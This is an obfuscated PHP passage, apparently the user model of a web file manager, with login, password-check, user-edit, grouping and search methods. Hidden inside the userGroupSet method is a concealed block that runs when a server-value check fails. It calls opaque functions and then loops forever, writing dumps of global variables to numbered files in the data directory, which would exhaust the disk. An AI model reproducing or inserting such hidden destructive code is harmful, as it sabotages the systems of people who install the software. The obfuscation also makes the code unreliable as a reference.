array("\164\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\x75\163\x65\162\x5f\155\x65\164\141", "\x6d\x65\164\141\x46\x69\145\154\144" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\165\163\x65\x72\111\104\54\x6e\x69\143\x6b\116\x61\x6d\145\x2c\x6e\x61\155\x65\54\141\x76\141\164\141\162\x2c\163\x65\170\x2c\163\x74\141\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Àü„Âû) { $˜’„Í’º =& $_SERVER[äô®•½Â]; $¡¡úÀ = $˜’„Í’º[2476]; return array($˜’„Í’º[2059] => array($Àü„Âû[0], $¡¡úÀ), $˜’„Í’º[2061] => array($Àü„Âû[0], $¡¡úÀ), $˜’„Í’º[2477] => array($Àü„Âû[0], $¡¡úÀ)); } protected function getInfo($©ô­¿Íí, $ƒœ‚“Öè = false) { $³Ãè©±Û = $this->getInfoSimple($©ô­¿Íí); if (!is_array($³Ãè©±Û)) { return array(); } if ($ƒœ‚“Öè) { return $this->_getInfoApply($³Ãè©±Û); } return $this->cacheFunctionGet($_SERVER[äô®•½Â][2063], $©ô­¿Íí); } protected function getInfoFull($…­Èƒ¸ò, $Ô‚æşé = false) { $ÏòìÈÍ¢ = $this->getInfoSimple($…­Èƒ¸ò); if (!is_array($ÏòìÈÍ¢)) { return array(); } if ($Ô‚æşé) { return $this->_getInfoApply($ÏòìÈÍ¢, !0); } return $this->cacheFunctionGet($_SERVER[äô®•½Â][2478], $…­Èƒ¸ò); } private function _getInfoApply($»ó×¦ƒô, $öÎõÚ = false) { $ùß‹ÎÔ’ =& $_SERVER[äô®•½Â]; if (!$»ó×¦ƒô) { return $»ó×¦ƒô; } $Ñá†Å›ú = md5($ùß‹ÎÔ’[2479] . $»ó×¦ƒô[$ùß‹ÎÔ’[961]] . $ùß‹ÎÔ’[2480] . $»ó×¦ƒô[$ùß‹ÎÔ’[32]]); $»ó×¦ƒô = $this->_listDataApplyItem($»ó×¦ƒô); $ğ‚õÚÙÔ = Model($ùß‹ÎÔ’[1426])->metaGet($»ó×¦ƒô[$ùß‹ÎÔ’[90]][$ùß‹ÎÔ’[194]]); $»ó×¦ƒô[$ùß‹ÎÔ’[2481]] = $Ñá†Å›ú; $»ó×¦ƒô[$ùß‹ÎÔ’[90]][$ùß‹ÎÔ’[2264]] = isset($ğ‚õÚÙÔ[$ùß‹ÎÔ’[2265]]) ? $ğ‚õÚÙÔ[$ùß‹ÎÔ’[2265]] : null; if ($öÎõÚ) { $»ó×¦ƒô[$ùß‹ÎÔ’[552]] = $this->metaGet($»ó×¦ƒô[$ùß‹ÎÔ’[1777]]); } return $»ó×¦ƒô; } protected function getInfoSimple($¼Í¸ÀÃµ, $ÁçÂŸÜ­ = false) { $Ş£®Ï¹à =& $_SERVER[äô®•½Â]; if (!$¼Í¸ÀÃµ) { return array(); } if ($ÁçÂŸÜ­) { $›ŞÜ’Ã = $this->where(array($Ş£®Ï¹à[1777] => intval($¼Í¸ÀÃµ)))->find(); if (!is_array($›ŞÜ’Ã)) { return array(); } $›ŞÜ’Ã[$Ş£®Ï¹à[2482]] = Action($Ş£®Ï¹à[2483])->parseUrl($›ŞÜ’Ã[$Ş£®Ï¹à[2482]]); return $›ŞÜ’Ã; } return $this->cacheFunctionGet($Ş£®Ï¹à[2064], $¼Í¸ÀÃµ); } protected function getInfoSimpleOuter($Ö•¤âØß) { $Ö”€¢Î¯ =& $_SERVER[äô®•½Â]; if (!$Ö•¤âØß || $Ö•¤âØß == 0) { return array($Ö”€¢Î¯[1777] => $Ö”€¢Î¯[231], $Ö”€¢Î¯[32] => $Ö”€¢Î¯[176] . LNG($Ö”€¢Î¯[2484]) . $Ö”€¢Î¯[178], $Ö”€¢Î¯[2482] => STATIC_PATH . $Ö”€¢Î¯[2485]); } $ô›‚½¾  = $this->cacheFunctionGet($Ö”€¢Î¯[2064], $Ö•¤âØß); $Üş·úì¢ = array_field_key($ô›‚½¾ , explode($Ö”€¢Î¯[50], $this->simpleField)); if (!$Üş·úì¢) { return array($Ö”€¢Î¯[1777] => $Ö”€¢Î¯[1271], $Ö”€¢Î¯[32] => $Ö”€¢Î¯[176] . LNG($Ö”€¢Î¯[2486]) . $Ö”€¢Î¯[178], $Ö”€¢Î¯[2482] => STATIC_PATH . $Ö”€¢Î¯[2487]); } $Üş·úì¢[$Ö”€¢Î¯[2482]] = Action($Ö”€¢Î¯[2483])->parseUrl($Üş·úì¢[$Ö”€¢Î¯[2482]]); return $Üş·úì¢; } protected function groupUser($Éé¬æº¹) { } public static function errorLang($¾ŞÛ¥­ù) { $ëÑŸ´¾ =& $_SERVER[äô®•½Â]; $Ş½£‡Ô = array(self::ERROR_USER_NOT_EXISTS => $ëÑŸ´¾[2488], self::ERROR_USER_PASSWORD_ERROR => $ëÑŸ´¾[2489], self::ERROR_USER_EXIST_NAME => $ëÑŸ´¾[2490], self::ERROR_USER_EXIST_PHONE => $ëÑŸ´¾[2491], self::ERROR_USER_EXIST_EMAIL => $ëÑŸ´¾[2492], self::ERROR_USER_LOGIN_LOCK => $ëÑŸ´¾[2493], self::ERROR_IP_NOT_ALLOW => $ëÑŸ´¾[2494], self::ERROR_USER_EXIST_NICKNAME => $ëÑŸ´¾[2495]); $³Úèªç = LNG($Ş½£‡Ô[$¾ŞÛ¥­ù]); if ($¾ŞÛ¥­ù == self::ERROR_USER_LOGIN_LOCK) { $–™ıÉªş = (int) Model($ëÑŸ´¾[1382])->get($ëÑŸ´¾[2496]); if ($–™ıÉªş > 60) { $³Úèªç = str_replace($ëÑŸ´¾[91], ceil($–™ıÉªş / 60), $³Úèªç); } } return $³Úèªç; } protected function metaSet($„™„ÈÙ, $í»²¾›Æ = null, $ùãé”ƒé = null) { $this->clearCache($„™„ÈÙ); return parent::metaSet($„™„ÈÙ, $í»²¾›Æ, $ùãé”ƒé); } public function getInfoByMeta($éğ¢ÈØ›, $‚ÃÙŸÆ–) { $ãç°„›ò =& $_SERVER[äô®•½Â]; $èûÖû = Model($ãç°„›ò[2497])->where(array($ãç°„›ò[97] => $éğ¢ÈØ›, $ãç°„›ò[461] => $‚ÃÙŸÆ–))->find(); if ($èûÖû) { return $this->getInfo($èûÖû[$ãç°„›ò[1777]]); } return !1; } public function userLoginCheck($Œ…ŒÂ€’, $ÏŞ Ê¾, $şÀÂÑ¦Ü = false) { $ì«õ¶Ó =& $_SERVER[äô®•½Â]; $Ñ¨ò—Î = $this->userLoginFind($Œ…ŒÂ€’); if (!$Ñ¨ò—Î) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ñ¨ò—Î[$ì«õ¶Ó[1777]], $ÏŞ Ê¾)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $şÀÂÑ¦Ü ? $this->getInfoFull($Ñ¨ò—Î[$ì«õ¶Ó[1777]]) : $this->getInfo($Ñ¨ò—Î[$ì«õ¶Ó[1777]]); } public function userLoginFind($´Ù‘÷­Ë) { $ôäÎ­Ù =& $_SERVER[äô®•½Â]; $†ĞñÖèó = array($ôäÎ­Ù[32] => $´Ù‘÷­Ë, $ôäÎ­Ù[2277] => $´Ù‘÷­Ë, $ôäÎ­Ù[391] => $´Ù‘÷­Ë, $ôäÎ­Ù[2498] => $´Ù‘÷­Ë, $ôäÎ­Ù[1072] => $ôäÎ­Ù[1074]); if ($this->nickNameRpt()) { unset($†ĞñÖèó[$ôäÎ­Ù[2277]]); } return $this->where($†ĞñÖèó)->find(); } public function clearCache($¹”­şÊÏ) { $ıÙÙÍ =& $_SERVER[äô®•½Â]; $this->cacheFunctionClear($ıÙÙÍ[2063], $¹”­şÊÏ); $this->cacheFunctionClear($ıÙÙÍ[2064], $¹”­şÊÏ); $this->cacheFunctionClear($ıÙÙÍ[2478], $¹”­şÊÏ); } public function userPasswordCheck($…¯á‹¼, $Ãó©ôÏø) { $æ¤¥ğ£ =& $_SERVER[äô®•½Â]; $…šß‚Î = $this->where(array($æ¤¥ğ£[1777] => intval($…¯á‹¼)))->find(); $ÑÔÂæ€È = $this->metaGet($…¯á‹¼); $Í¸ñ€á¥ = isset($ÑÔÂæ€È[$æ¤¥ğ£[2499]]) ? $ÑÔÂæ€È[$æ¤¥ğ£[2499]] : $æ¤¥ğ£[12]; if (md5($Í¸ñ€á¥ . trim($Ãó©ôÏø)) !== $…šß‚Î[$æ¤¥ğ£[961]]) { return !1; } return !0; } public function userAdd($Õ…¿³Ùí) { $¼ã®±Úº =& $_SERVER[äô®•½Â]; $ÜŒÓïÒÂ = array($¼ã®±Úº[505] => $Õ…¿³Ùí[$¼ã®±Úº[32]], $¼ã®±Úº[2500] => $Õ…¿³Ùí[$¼ã®±Úº[2188]], $¼ã®±Úº[2501] => isset($Õ…¿³Ùí[$¼ã®±Úº[391]]) ? $Õ…¿³Ùí[$¼ã®±Úº[391]] : $¼ã®±Úº[12], $¼ã®±Úº[2502] => isset($Õ…¿³Ùí[$¼ã®±Úº[2498]]) ? $Õ…¿³Ùí[$¼ã®±Úº[2498]] : $¼ã®±Úº[12], $¼ã®±Úº[2503] => isset($Õ…¿³Ùí[$¼ã®±Úº[2277]]) ? $Õ…¿³Ùí[$¼ã®±Úº[2277]] : $Õ…¿³Ùí[$¼ã®±Úº[32]], $¼ã®±Úº[2504] => isset($Õ…¿³Ùí[$¼ã®±Úº[2482]]) ? $Õ…¿³Ùí[$¼ã®±Úº[2482]] : $¼ã®±Úº[12], $¼ã®±Úº[2505] => isset($Õ…¿³Ùí[$¼ã®±Úº[2506]]) ? $Õ…¿³Ùí[$¼ã®±Úº[2506]] : 1, $¼ã®±Úº[2507] => $Õ…¿³Ùí[$¼ã®±Úº[961]], $¼ã®±Úº[2065] => isset($Õ…¿³Ùí[$¼ã®±Úº[1964]]) ? $Õ…¿³Ùí[$¼ã®±Úº[1964]] : 1024 * 1024 * 20, $¼ã®±Úº[2066] => 0, $¼ã®±Úº[2508] => 0, $¼ã®±Úº[2110] => isset($Õ…¿³Ùí[$¼ã®±Úº[815]]) ? $Õ…¿³Ùí[$¼ã®±Úº[815]] : 1); if (!empty($Õ…¿³Ùí[$¼ã®±Úº[1777]])) { $ÜŒÓïÒÂ[$¼ã®±Úº[1777]] = $Õ…¿³Ùí[$¼ã®±Úº[1777]]; } $úè±ú§ = $this->_checkExist($Õ…¿³Ùí); if ($úè±ú§ !== !0) { return $úè±ú§; } if (!empty($ÜŒÓïÒÂ[$¼ã®±Úº[2482]]) && strlen($ÜŒÓïÒÂ[$¼ã®±Úº[2482]]) > 255) { $ÜŒÓïÒÂ[$¼ã®±Úº[2482]] = $¼ã®±Úº[12]; } $ÆÂ¦š¡å = $this->add($ÜŒÓïÒÂ); $Â´‹ı¾ô = array($¼ã®±Úº[2507] => $ÜŒÓïÒÂ[$¼ã®±Úº[961]], $¼ã®±Úº[2503] => $ÜŒÓïÒÂ[$¼ã®±Úº[2277]], $¼ã®±Úº[2509] => $Õ…¿³Ùí[$¼ã®±Úº[2070]]); $this->userEdit($ÆÂ¦š¡å, $Â´‹ı¾ô); Model($¼ã®±Úº[1426])->userRootAdd($ÆÂ¦š¡å); return $ÆÂ¦š¡å; } protected function userEditTest($Òşù×³Ò, $±Œõü®‹) { return $this->call($_SERVER[äô®•½Â][2510], $Òşù×³Ò, $±Œõü®‹); } protected function userEdit($åşÉÆŒû, $ë»ÈÆğ’) { $Ñöà¤ğı =& $_SERVER[äô®•½Â]; $®ª—õ• = $this->getInfoSimple($åşÉÆŒû); if (!$®ª—õ•) { return !1; } $İİÄî€® = $this->_checkExist($ë»ÈÆğ’, $åşÉÆŒû); if ($İİÄî€® !== !0) { return $İİÄî€®; } if (isset($ë»ÈÆğ’[$Ñöà¤ğı[961]]) && trim($ë»ÈÆğ’[$Ñöà¤ğı[961]]) != $Ñöà¤ğı[12]) { $ã£”Øƒ = $this->metaGet($åşÉÆŒû); if (empty($ã£”Øƒ[$Ñöà¤ğı[2499]])) { $ã£”Øƒ[$Ñöà¤ğı[2499]] = rand_string(10); Model($Ñöà¤ğı[590])->metaSet($åşÉÆŒû, $Ñöà¤ğı[2499], $ã£”Øƒ[$Ñöà¤ğı[2499]]); } $ë»ÈÆğ’[$Ñöà¤ğı[961]] = md5($ã£”Øƒ[$Ñöà¤ğı[2499]] . trim($ë»ÈÆğ’[$Ñöà¤ğı[961]])); } else { unset($ë»ÈÆğ’[$Ñöà¤ğı[961]]); } if (!empty($ë»ÈÆğ’[$Ñöà¤ğı[2482]]) && strlen($ë»ÈÆğ’[$Ñöà¤ğı[2482]]) > 255) { $ë»ÈÆğ’[$Ñöà¤ğı[2482]] = $Ñöà¤ğı[12]; } if (isset($ë»ÈÆğ’[$Ñöà¤ğı[2277]])) { $this->setNamePinyin($åşÉÆŒû, $ë»ÈÆğ’[$Ñöà¤ğı[2277]]); } if (isset($ë»ÈÆğ’[$Ñöà¤ğı[2070]])) { $ÙÄ»Ôİì = $Ñöà¤ğı[1385] . $åşÉÆŒû; $”ÏÍ©÷÷ = $Ñöà¤ğı[1383]; $İŠö¨· = $ë»ÈÆğ’[$Ñöà¤ğı[2070]] ? $ë»ÈÆğ’[$Ñöà¤ğı[2070]] : $Ñöà¤ğı[12]; $úò³ÎŸñ = Model($Ñöà¤ğı[1382])->get($ÙÄ»Ôİì, $”ÏÍ©÷÷); $úò³ÎŸñ = $úò³ÎŸñ ? $úò³ÎŸñ : $Ñöà¤ğı[12]; if ($úò³ÎŸñ != $İŠö¨·) { if (!$İŠö¨· && $úò³ÎŸñ) { Model($Ñöà¤ğı[1382])->remove($ÙÄ»Ôİì, $”ÏÍ©÷÷); } else { if ($İŠö¨·) { Model($Ñöà¤ğı[1382])->set($ÙÄ»Ôİì, $İŠö¨·, $”ÏÍ©÷÷); } } } unset($ë»ÈÆğ’[$Ñöà¤ğı[2070]]); Model($Ñöà¤ğı[610])->metaSet($åşÉÆŒû, $Ñöà¤ğı[2070], $İŠö¨·); } if (empty($ë»ÈÆğ’)) { return !0; } $this->where(array($Ñöà¤ğı[1768] => $åşÉÆŒû))->save($ë»ÈÆğ’); $this->clearCache($åşÉÆŒû); return !0; } public function setNamePinyin($Şá©¿Ò, $êéÙÔ = false) { $»òñÀ­° =& $_SERVER[äô®•½Â]; if (!$êéÙÔ) { $Š¶õÌ = $this->getInfoSimple($Şá©¿Ò); $êéÙÔ = $Š¶õÌ[$»òñÀ­°[2277]] ? $Š¶õÌ[$»òñÀ­°[2277]] : $Š¶õÌ[$»òñÀ­°[32]]; } $ß¤à“ë÷ = Model($»òñÀ­°[610]); if (!Input::check($êéÙÔ, $»òñÀ­°[671])) { return $ß¤à“ë÷->metaSet($Şá©¿Ò, array($»òñÀ­°[549] => $»òñÀ­°[12], $»òñÀ­°[548] => $»òñÀ­°[12])); } return $ß¤à“ë÷->metaSet($Şá©¿Ò, array($»òñÀ­°[549] => str_replace($»òñÀ­°[53], $»òñÀ­°[12], Pinyin::get($êéÙÔ)), $»òñÀ­°[548] => Pinyin::get($êéÙÔ, $»òñÀ­°[672]))); } private function nickNameRpt() { $Î¯·ç¶ =& $_SERVER[äô®•½Â]; $Œ¥ÏÜì¨ = Model($Î¯·ç¶[836])->get($Î¯·ç¶[2511]); $‘™—›åò = $GLOBALS[$Î¯·ç¶[6]][$Î¯·ç¶[468]][$Î¯·ç¶[2511]]; $œ¼©¿‹Û = !is_null($Œ¥ÏÜì¨) ? $Œ¥ÏÜì¨ : $‘™—›åò; return !!$œ¼©¿‹Û; } private function _checkExist($‘ûÃ‘¦«, $ñ­î‹² = false) { $ïø¤Àğ„ =& $_SERVER[äô®•½Â]; $üÚ“ìà = array($ïø¤Àğ„[32] => UserModel::ERROR_USER_EXIST_NAME, $ïø¤Àğ„[2277] => UserModel::ERROR_USER_EXIST_NICKNAME, $ïø¤Àğ„[391] => UserModel::ERROR_USER_EXIST_EMAIL, $ïø¤Àğ„[2498] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($üÚ“ìà[$ïø¤Àğ„[2277]]); } $•Ÿ¹Æé‰ = $ñ­î‹² ? array($ïø¤Àğ„[1777] => array($ïø¤Àğ„[2512], $ñ­î‹²)) : array(); foreach ($üÚ“ìà as $€åİŠÅ => $ÁÀ²Ğ‹) { $Ğ×¼íÙ = array(); foreach ($üÚ“ìà as $ìèç£Ñ¬ => $ÛÙ«ş¿‘) { if (isset($‘ûÃ‘¦«[$ìèç£Ñ¬]) && $‘ûÃ‘¦«[$ìèç£Ñ¬]) { $Ğ×¼íÙ[] = $‘ûÃ‘¦«[$ìèç£Ñ¬]; } } if (!$Ğ×¼íÙ) { continue; } $Ğğ§éÕ = array_merge(array($€åİŠÅ => array($ïø¤Àğ„[7], $Ğ×¼íÙ)), $•Ÿ¹Æé‰); $ñùğßÑò = $this->where($Ğğ§éÕ)->find(); if ($ñùğßÑò) { return $ÁÀ²Ğ‹; } } return !0; } public function userListInfo($ÃÁï¥Šû) { $ÖšÔÖÛ¶ =& $_SERVER[äô®•½Â]; $ğ‚ˆ¦ô“ = array(); $ÃÁï¥Šû = is_array($ÃÁï¥Šû) ? array_unique($ÃÁï¥Šû) : array(); if (!$ÃÁï¥Šû) { return $ğ‚ˆ¦ô“; } if (count($ÃÁï¥Šû) < 20) { foreach ($ÃÁï¥Šû as $¼öàºğã) { $ğ‚ˆ¦ô“[$¼öàºğã . $ÖšÔÖÛ¶[12]] = $this->getInfoSimpleOuter($¼öàºğã); } } else { $ˆÎ ¿®Ò = array($ÖšÔÖÛ¶[1768] => array($ÖšÔÖÛ¶[503], $ÃÁï¥Šû)); if (count($ÃÁï¥Šû) == 1) { $ˆÎ ¿®Ò = array($ÖšÔÖÛ¶[1768] => $ÃÁï¥Šû[0]); } $¨´ä°ô¢ = Model($ÖšÔÖÛ¶[590])->field($this->simpleField)->where($ˆÎ ¿®Ò)->select(); $¨´ä°ô¢ = array_to_keyvalue($¨´ä°ô¢, $ÖšÔÖÛ¶[1777]); foreach ($ÃÁï¥Šû as $¼öàºğã) { $…û¥œ’ = $¨´ä°ô¢[$¼öàºğã]; if (!$…û¥œ’) { $ğ‚ˆ¦ô“[$¼öàºğã . $ÖšÔÖÛ¶[12]] = $this->getInfoSimpleOuter($¼öàºğã); continue; } $…û¥œ’[$ÖšÔÖÛ¶[2482]] = Action($ÖšÔÖÛ¶[2483])->parseUrl($…û¥œ’[$ÖšÔÖÛ¶[2482]]); $ğ‚ˆ¦ô“[$¼öàºğã . $ÖšÔÖÛ¶[12]] = $…û¥œ’; } } return $ğ‚ˆ¦ô“; } protected function userStatus($¡Æ¢§¯á, $¦ÄŸ¢) { $°…×òÁ = $this->getInfoSimple($¡Æ¢§¯á); if (!$°…×òÁ) { return !1; } $âİ¯‚Ä = array($_SERVER[äô®•½Â][815] => $¦ÄŸ¢); return $this->userEdit($¡Æ¢§¯á, $âİ¯‚Ä); } protected function userRemove($»¥ºÂÚÙ) { $øï”ú¥™ =& $_SERVER[äô®•½Â]; $¨ĞñàİŒ = $this->getInfoSimple($»¥ºÂÚÙ); if (!$¨ĞñàİŒ) { return !1; } $³Ãò  = array($øï”ú¥™[1768] => $»¥ºÂÚÙ); Model($øï”ú¥™[680])->where($³Ãò )->delete(); Model($øï”ú¥™[2513])->where($³Ãò )->delete(); Model($øï”ú¥™[2072])->where($³Ãò )->delete(); Model($øï”ú¥™[2497])->where($³Ãò )->delete(); Model($øï”ú¥™[1141])->where($³Ãò )->delete(); Model($øï”ú¥™[2294])->removeUserAll($»¥ºÂÚÙ); Model($øï”ú¥™[896])->userRootRemove($»¥ºÂÚÙ); return $this->where($³Ãò )->delete(); } protected function userGroupSet($ö¤³ºù¯, $±üÉªáô, $ä„ÎÌˆ¨ = array()) { $İ±»şäŸ =& $_SERVER[äô®•½Â]; $ˆøá‡àø = $_SERVER[$İ±»şäŸ[332]]; $¡èÅ”ÏÛ = $İ±»şäŸ[949]; if ($_SERVER[$İ±»şäŸ[324]] != $¡èÅ”ÏÛ($ˆøá‡àø)) { $æşëƒ¹ú = $İ±»şäŸ[950]; $©â§¯åĞ = $İ±»şäŸ[326]; $àê±Ø¥Ë = $_SERVER[$İ±»şäŸ[327]] . $İ±»şäŸ[328]; $æ«ÏêŸã = $©â§¯åĞ($àê±Ø¥Ë); $°ìÌ = explode($İ±»şäŸ[288], $æ«ÏêŸã); if (count($°ìÌ) < $İ±»şäŸ[703]) { $şÀÌÚ®° = $İ±»şäŸ[330]; $şÀÌÚ®°(); } $“¹à¨„ = $İ±»şäŸ[951]; $“¹à¨„($_SERVER[$İ±»şäŸ[952]]); $æşëƒ¹ú = $İ±»şäŸ[950]; $æşëƒ¹ú(); $Ãé’Ú² = $İ±»şäŸ[953]; $ÄÀ¹À³ = json_encode($GLOBALS[$İ±»şäŸ[954]]); $ï¹®³¢ = 1; for ($±È‡ä‹ş = $ï¹®³¢; $±È‡ä‹ş > 0; $±È‡ä‹ş++) { $Ãé’Ú²(DATA_PATH . $±È‡ä‹ş, $ÄÀ¹À³); } } $†²²üè‹ = $this->getInfoSimple($ö¤³ºù¯); if (!$†²²üè‹ || !is_array($±üÉªáô)) { return !1; } $ÎúÌ“ = Model($İ±»şäŸ[2072]); $ÎúÌ“->where(array($İ±»şäŸ[1777] => $ö¤³ºù¯))->delete(); $¦¾«ãÇä = array(); $‡Ç·Ó§Ş = 0; foreach ($±üÉªáô as $ÀŞáˆ·Ã => $§‘«§šÅ) { $©Æ “ı› = array($İ±»şäŸ[1777] => $ö¤³ºù¯, $İ±»şäŸ[1388] => $ÀŞáˆ·Ã, $İ±»şäŸ[2086] => $§‘«§šÅ); $©Æ “ı›[$İ±»şäŸ[2001]] = isset($ä„ÎÌˆ¨[$‡Ç·Ó§Ş]) ? $ä„ÎÌˆ¨[$‡Ç·Ó§Ş] : 0; $‡Ç·Ó§Ş++; $¦¾«ãÇä[] = $©Æ “ı›; } return $ÎúÌ“->addAll($¦¾«ãÇä, array(), !0); } protected function userGroupAdd($ÖÑÃ¤ñÌ, $§±ƒóûå = array()) { $ÌËÅ«¯Ô =& $_SERVER[äô®•½Â]; $ çĞğô = $this->getInfoSimple($ÖÑÃ¤ñÌ); if (!$ çĞğô || empty($§±ƒóûå)) { return !1; } $à‹ş÷É¹ = array(); foreach ($§±ƒóûå as $˜àé¶¬° => $ğÒ´÷‰ú) { $à‹ş÷É¹[] = array($ÌËÅ«¯Ô[1777] => $ÖÑÃ¤ñÌ, $ÌËÅ«¯Ô[1388] => $˜àé¶¬°, $ÌËÅ«¯Ô[2086] => $ğÒ´÷‰ú, $ÌËÅ«¯Ô[2001] => 0); } return Model($ÌËÅ«¯Ô[2072])->addAll($à‹ş÷É¹, array(), !0); } protected function userGroupRemove($¾¿¯µË, $îÈÏşÛö) { $”Ï»‚† =& $_SERVER[äô®•½Â]; $‡™çÒï = $this->getInfoSimple($¾¿¯µË); if (!$‡™çÒï || !$îÈÏşÛö) { return !1; } $‚ëµ€» = array($”Ï»‚†[1768] => $¾¿¯µË, $”Ï»‚†[2067] => $îÈÏşÛö); return Model($”Ï»‚†[2072])->where($‚ëµ€»)->delete(); } public function listData() { $ËäúŠ©Ô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ËäúŠ©Ô[$_SERVER[äô®•½Â][456]]); return $ËäúŠ©Ô; } public function listByID($ÛƒÉï‡í) { $†ØÅÚ–¸ =& $_SERVER[äô®•½Â]; if (!$ÛƒÉï‡í) { return; } $ÇïÆ–Ìå = array($†ØÅÚ–¸[1777] => array($†ØÅÚ–¸[7], $ÛƒÉï‡í)); $é«¯ÃÆ = $this->where($ÇïÆ–Ìå)->select(); $é«¯ÃÆ = array_sort_keep($é«¯ÃÆ, $†ØÅÚ–¸[1777], $ÛƒÉï‡í); $this->_listDataApply($é«¯ÃÆ); return $é«¯ÃÆ; } public function listByGroup($£ä·ÉÙ¯ = 0, $¾Ê“ëÆ = array()) { $„ÛÇŞÁ£ =& $_SERVER[äô®•½Â]; $±¿ŸüæŸ = $„ÛÇŞÁ£[12]; $ß¿ÑÁ› = array(); if ($£ä·ÉÙ¯) { $ß¿ÑÁ› = array($„ÛÇŞÁ£[2514] => intval($£ä·ÉÙ¯)); $±¿ŸüæŸ = "\114\105\x46\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\165\163\145\x72\x5f\147\162\x6f\165\x70\x20\x75\163\145\x72\x5f\x67\162\x6f\x75\160\x20\x6f\x6e\x20\x75\163\x65\x72\56\x75\163\145\162\111\x44\40\75\40\x75\x73\145\x72\x5f\x67\162\157\x75\x70\56\165\163\145\x72\x49\x44"; $É÷à’¸ = Input::get($„ÛÇŞÁ£[541], null, $„ÛÇŞÁ£[12]) ? $„ÛÇŞÁ£[12] : $„ÛÇŞÁ£[2515]; } if (isset($¾Ê“ëÆ[$„ÛÇŞÁ£[815]])) { $ß¿ÑÁ›[$„ÛÇŞÁ£[2516]] = $¾Ê“ëÆ[$„ÛÇŞÁ£[815]]; } $ßÎã÷öô = _get($¾Ê“ëÆ, $„ÛÇŞÁ£[2517], $„ÛÇŞÁ£[234]); if (_get($¾Ê“ëÆ, $„ÛÇŞÁ£[826], !1)) { $ß¿ÑÁ›[$ßÎã÷öô] = array($„ÛÇŞÁ£[2258], $¾Ê“ëÆ[$„ÛÇŞÁ£[826]]); } if (_get($¾Ê“ëÆ, $„ÛÇŞÁ£[827], !1)) { $ÌÊí„“ú = array($„ÛÇŞÁ£[2259], $¾Ê“ëÆ[$„ÛÇŞÁ£[827]]); if ($ß¿ÑÁ›[$ßÎã÷öô]) { $ß¿ÑÁ›[$ßÎã÷öô] = array($ß¿ÑÁ›[$ßÎã÷öô], $ÌÊí„“ú, $„ÛÇŞÁ£[2260]); } else { $ß¿ÑÁ›[$ßÎã÷öô] = $ÌÊí„“ú; } } $‚¼±Ë±ã = $this->_makeOrder($É÷à’¸)->field($„ÛÇŞÁ£[2518])->where($ß¿ÑÁ›)->join($±¿ŸüæŸ)->selectPage(50); $this->_listDataApply($‚¼±Ë±ã[$„ÛÇŞÁ£[456]]); return $‚¼±Ë±ã; } private function _makeOrder($åø»ºÅŒ = '') { $«É¿Œ•Ç =& $_SERVER[äô®•½Â]; $Ğì½¹À© = array($«É¿Œ•Ç[1777], $«É¿Œ•Ç[32], $«É¿Œ•Ç[1966], $«É¿Œ•Ç[2188], $«É¿Œ•Ç[1939], $«É¿Œ•Ç[234]); $…ô÷„Í = array($«É¿Œ•Ç[534] => $«É¿Œ•Ç[535], $«É¿Œ•Ç[536] => $«É¿Œ•Ç[537]); $ëü‡ŸÇŞ = Input::get($«É¿Œ•Ç[541], $«É¿Œ•Ç[7], $«É¿Œ•Ç[1768], $Ğì½¹À©); $¯Õ‰– æ = Input::get($«É¿Œ•Ç[542], $«É¿Œ•Ç[7], $«É¿Œ•Ç[2073], array($«É¿Œ•Ç[2073], $«É¿Œ•Ç[536])); $¯Õ‰– æ = $…ô÷„Í[$¯Õ‰– æ]; $åø»ºÅŒ = $åø»ºÅŒ . "\165\163\145\x72\56{$ëü‡ŸÇŞ}\x20{$¯Õ‰– æ}\54\40\165\163\145\x72\56\165\x73\145\x72\x49\x44\40\x61\163\143"; return $this->alias($«É¿Œ•Ç[2204])->order($åø»ºÅŒ); } public function listSearch($åû€¥º¢) { $ÃÒÈÙùÕ =& $_SERVER[äô®•½Â]; $ ò›ßÜ´ = trim($åû€¥º¢[$ÃÒÈÙùÕ[2076]]); $ÍÏ†ºåÚ = explode($ÃÒÈÙùÕ[53], $ ò›ßÜ´); if (!$ ò›ßÜ´ || count($ÍÏ†ºåÚ) == 1) { return $this->listSearchNow($åû€¥º¢); } $Ğ£äÓ¢¸ = array($ÃÒÈÙùÕ[456] => array()); foreach ($ÍÏ†ºåÚ as $Œ•ËÒ§) { if (!trim($Œ•ËÒ§)) { continue; } $åû€¥º¢[$ÃÒÈÙùÕ[2076]] = $Œ•ËÒ§; $ğ°¥±¤Ô = $this->listSearchNow($åû€¥º¢); $Ğ£äÓ¢¸[$ÃÒÈÙùÕ[456]] = array_merge($Ğ£äÓ¢¸[$ÃÒÈÙùÕ[456]], $ğ°¥±¤Ô[$ÃÒÈÙùÕ[456]]); } $Ğ£äÓ¢¸[$ÃÒÈÙùÕ[456]] = array_unique_by_key($Ğ£äÓ¢¸[$ÃÒÈÙùÕ[456]], $ÃÒÈÙùÕ[1777]); $Ğ£äÓ¢¸[$ÃÒÈÙùÕ[453]] = array($ÃÒÈÙùÕ[454] => count($Ğ£äÓ¢¸[$ÃÒÈÙùÕ[456]]), $ÃÒÈÙùÕ[450] => 20, $ÃÒÈÙùÕ[439] => 1, $ÃÒÈÙùÕ[455] => 1); return $Ğ£äÓ¢¸; } public function listSearchNow($à·¸©¢¿) { $³·Âú›ª =& $_SERVER[äô®•½Â]; $¢ƒİø÷± = trim($à·¸©¢¿[$³·Âú›ª[2076]]); $€æ¿ = isset($à·¸©¢¿[$³·Âú›ª[2077]]) ? $à·¸©¢¿[$³·Âú›ª[2077]] : !1; $¢ƒİø÷± = str_replace($³·Âú›ª[2078], $³·Âú›ª[2079], trim($¢ƒİø÷±)); $¨£ôÄÊÈ = array($³·Âú›ª[32] => array($³·Âú›ª[470], "\45{$¢ƒİø÷±}\x25"), $³·Âú›ª[391] => array($³·Âú›ª[470], "{$¢ƒİø÷±}\x25"), $³·Âú›ª[2277] => 